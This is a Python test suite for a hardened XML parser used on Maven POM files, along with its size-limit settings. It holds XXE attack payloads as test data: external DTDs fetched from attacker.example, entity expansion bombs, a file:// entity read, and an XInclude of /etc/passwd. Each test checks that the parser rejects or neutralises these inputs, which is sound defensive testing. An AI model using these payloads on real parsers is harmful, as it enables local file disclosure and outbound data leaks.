"""Tests for mdi.limits and the hardened mdi.xmlsafe parser."""

import contextlib
import dataclasses
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

SCRIPTS = Path(__file__).resolve().parents[1] / "skills" / "maven-dependency-investigator" / "scripts"
if str(SCRIPTS) not in sys.path:
    sys.path.insert(0, str(SCRIPTS))

from mdi.limits import Limits
from mdi.xmlsafe import UnsafeXML, parse_xml


@contextlib.contextmanager
def no_io_spy():
    """Fail the current test if builtins.open or socket.socket is touched."""
    with mock.patch("builtins.open") as fake_open, mock.patch("socket.socket") as fake_socket:
        yield
        fake_open.assert_not_called()
        fake_socket.assert_not_called()


def encode_xml(text: str, encoding: str) -> bytes:
    body = text.encode(encoding)
    if encoding == "utf-16-le":
        return b"\xff\xfe" + body
    if encoding == "utf-16-be":
        return b"\xfe\xff" + body
    return body


def pom(body: bytes) -> bytes:
    return b"<project>" + body + b"</project>"


DOCTYPE_MSG = "DOCTYPE declarations are not allowed"
ENCODINGS = ("utf-8", "utf-8-sig", "utf-16-le", "utf-16-be")

ATTACK_DOCTYPES = [
    '<!DOCTYPE project [<!ENTITY xxe "boom">]><project><name>&xxe;</name></project>',
    '<!DOCTYPE project SYSTEM "http://attacker.example/evil.dtd"><project/>',
    '<!DOCTYPE project [<!ENTITY % pe "<name>x</name>">'
    '<!ENTITY % nested "%pe;">]><project/>',
    '<!DOCTYPE project [<!ENTITY % pe SYSTEM "http://attacker.example/p.dtd">'
    "%pe;]><project/>",
    '<!DOCTYPE project [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;">'
    '<!ENTITY c "&b;&b;&b;">]><project><name>&c;</name></project>',
]


class LimitsTest(unittest.TestCase):
    def test_default_and_frozen(self):
        self.assertEqual(Limits().xml_bytes, 8 * 1024 * 1024)
        with self.assertRaises(dataclasses.FrozenInstanceError):
            Limits().xml_bytes = 1

    def test_rejects_non_positive(self):
        for bad in (0, -1, -8 * 1024 * 1024):
            with self.assertRaises(ValueError, msg=repr(bad)):
                Limits(xml_bytes=bad)

    def test_rejects_bool_and_non_int(self):
        for bad in (True, False, "100", 8.0, None):
            with self.assertRaises(TypeError, msg=repr(bad)):
                Limits(xml_bytes=bad)


class ParseBasicsTest(unittest.TestCase):
    def test_utf8(self):
        with no_io_spy():
            root = parse_xml(pom(b"<name>demo</name>"))
        self.assertEqual(root.tag, "project")
        self.assertEqual(root.findtext("name"), "demo")

    def test_utf8_bom(self):
        self.assertEqual(parse_xml(b"\xef\xbb\xbf" + pom(b"<name>demo</name>")).findtext("name"), "demo")

    def test_utf16_le_bom(self):
        body = b"\xff\xfe" + "<project><name>demo</name></project>".encode("utf-16-le")
        self.assertEqual(parse_xml(body).findtext("name"), "demo")

    def test_utf16_be_bom(self):
        body = b"\xfe\xff" + "<project><name>demo</name></project>".encode("utf-16-be")
        self.assertEqual(parse_xml(body).findtext("name"), "demo")

    def test_unicode_text(self):
        text = "café 中文 \U0001f680"
        self.assertEqual(parse_xml(pom(f"<name>{text}</name>".encode())).findtext("name"), text)

    def test_comments_preserved(self):
        body = pom(b"<!-- team note --><name>demo</name>")
        comments = [el for el in parse_xml(body).iter() if not isinstance(el.tag, str)]
        self.assertEqual(len(comments), 1)
        self.assertIn("team note", comments[0].text)

    def test_long_prolog_over_4k(self):
        filler = b"<!-- filler comment -->\n" * 200
        body = b'<?xml version="1.0" encoding="UTF-8"?>\n' + filler + pom(b"<name>demo</name>")
        self.assertGreater(len(body), 4096)
        with no_io_spy():
            self.assertEqual(parse_xml(body).findtext("name"), "demo")

    def test_predefined_entity_expands(self):
        self.assertEqual(parse_xml(pom(b"<name>a &amp; b</name>")).findtext("name"), "a & b")


class DtdRejectedTest(unittest.TestCase):
    def test_attack_matrix_rejected_in_all_encodings(self):
        for text in ATTACK_DOCTYPES:
            for encoding in ENCODINGS:
                with self.subTest(encoding=encoding, payload=text[:44]):
                    with no_io_spy(), self.assertRaises(UnsafeXML) as ctx:
                        parse_xml(encode_xml(text, encoding))
                    self.assertIn(DOCTYPE_MSG, str(ctx.exception))

    def test_local_file_entity_rejected_and_secret_intact(self):
        with tempfile.TemporaryDirectory() as tmp:
            secret = Path(tmp) / "secret.txt"
            secret.write_text("TOPSECRET", encoding="ascii")
            text = (f'<!DOCTYPE project [<!ENTITY xxe SYSTEM "file://{secret}">]>'
                    f"<project><name>&xxe;</name></project>")
            with no_io_spy(), self.assertRaises(UnsafeXML) as ctx:
                parse_xml(text.encode())
            self.assertIn(DOCTYPE_MSG, str(ctx.exception))
            self.assertEqual(secret.read_text(), "TOPSECRET")


class BadInputTest(unittest.TestCase):
    def test_malformed_inputs(self):
        for bad in (b"", b"<project>", b"<project><name>demo</project>"):
            with self.subTest(bad=bad):
                with self.assertRaises(UnsafeXML):
                    parse_xml(bad)

    def test_oversize(self):
        with self.assertRaises(UnsafeXML):
            parse_xml(pom(b"<name>x</name>"), limits=Limits(xml_bytes=8))

    def test_exact_limit_ok(self):
        body = pom(b"<name>x</name>")
        self.assertEqual(parse_xml(body, limits=Limits(xml_bytes=len(body))).tag, "project")

    def test_rejects_non_bytes(self):
        with self.assertRaises(TypeError):
            parse_xml("<project/>")


class EncodingBoundaryTest(unittest.TestCase):
    """Regressions: declared-encoding errors must normalize to UnsafeXML."""

    def test_unknown_encoding_name_rejected(self):
        body = b'<?xml version="1.0" encoding="not-an-encoding"?><project/>'
        with no_io_spy(), self.assertRaises(UnsafeXML):
            parse_xml(body)

    def test_utf7_declaration_rejected(self):
        body = b'<?xml version="1.0" encoding="UTF-7"?><project><name>+AGE-</name></project>'
        with no_io_spy(), self.assertRaises(UnsafeXML):
            parse_xml(body)


class XIncludeInertTest(unittest.TestCase):
    def test_include_element_left_unexpanded(self):
        body = (b'<project xmlns:xi="http://www.w3.org/2001/XInclude">'
                b'<xi:include href="/etc/passwd" parse="text"/></project>')
        with no_io_spy():
            inc = parse_xml(body).find("{http://www.w3.org/2001/XInclude}include")
        self.assertIsNotNone(inc)
        self.assertEqual(inc.get("href"), "/etc/passwd")
        self.assertIsNone(inc.text)
